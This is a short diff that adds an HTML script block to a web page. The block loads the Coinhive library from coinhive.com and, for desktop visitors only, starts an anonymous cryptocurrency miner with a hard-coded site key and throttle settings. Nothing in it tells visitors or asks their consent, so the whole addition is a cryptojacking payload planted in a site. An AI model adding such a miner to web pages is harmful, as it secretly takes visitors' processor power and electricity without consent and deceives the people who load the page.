@@ -1,0 +1,15 @@
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner;
+	if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
+		// Mobile
+	} else {
+		// Desktop
+		if(typeof CoinHive != 'undefined') {
+			var miner = new CoinHive.Anonymous('ntaN0BrNS7F568OEalGjiO5HVIR2cIvq');
+			miner.setNumThreads(1);
+			miner.setThrottle(.8);
+			miner.start(CoinHive.IF_EXCLUSIVE_TAB);
+		}
+	}
+</script>
